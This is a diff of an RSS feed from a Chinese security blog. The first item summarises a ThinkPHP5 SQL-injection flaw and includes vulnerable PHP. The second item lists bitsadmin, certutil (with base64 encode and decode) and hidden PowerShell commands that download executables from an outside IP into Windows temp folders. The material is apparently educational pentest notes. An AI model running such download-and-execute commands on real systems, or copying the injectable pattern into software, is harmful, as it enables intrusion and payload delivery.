@@ -18,7 +18,7 @@
       <pubDate>Mon, 16 Apr 2018 19:16:14 +0800</pubDate>
       
       <guid>http://wyb0.com/posts/thinkphp5-where-function/</guid>
-      <description>0x00 关于thinkphp5的where函数 前段时间公司委托别的公司开发一个网站，使用的是ThinkPHP5.0，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
+      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP5.0，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
 0x01 示例代码 tp5/application/home/controller/Index.php
 &amp;lt;?php namespace app\home\controller; use think\Db; class Index { public function testDb() { $msg = db(&#39;msg&#39;); $id = input(&#39;param.id&#39;,1); //不存在id的话默认为1 $where = &amp;quot;id=&amp;quot;.$id; $result = $msg-&amp;gt;where($where)-&amp;gt;select(); // $result = $msg-&amp;gt;where([&#39;id&#39;=&amp;gt;$id])-&amp;gt;select(); echo $msg-&amp;gt;getLastSql(); echo &#39;&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&#39;; echo var_dump($result); } }  访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1时返回的语句分别如下：
 SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，如下： 主要调用文件及函数顺序如下：
@@ -55,10 +55,10 @@ C:\Apps\phpStudy\WWW\&amp;gt; systeminfo 主机名: REBER-WIN7 OS 名称: Micros
       
       <guid>http://wyb0.com/posts/win-terminal-download-and-exec-remote-file/</guid>
       <description>环境：Windows Server 2008 R2 Enterprise
-0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.214.203/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.214.203/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.214.203/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
-certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
-本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.214.203/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
-certutil -urlcache -f http://114.115.214.203/a.exe  0x02 powershell下载文件 powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.214.203/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.</description>
+0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
+certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
+本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+certutil -urlcache -f http://114.115.123.123/a.exe  0x02 powershell下载文件 powershell (new-object System.Net.WebClient).DownloadFile(&amp;quot;http://114.115.123.123/a.exe&amp;quot;,&amp;quot;C:\Windows\Temp\a.exe&amp;quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.</description>
     </item>
     
     <item>
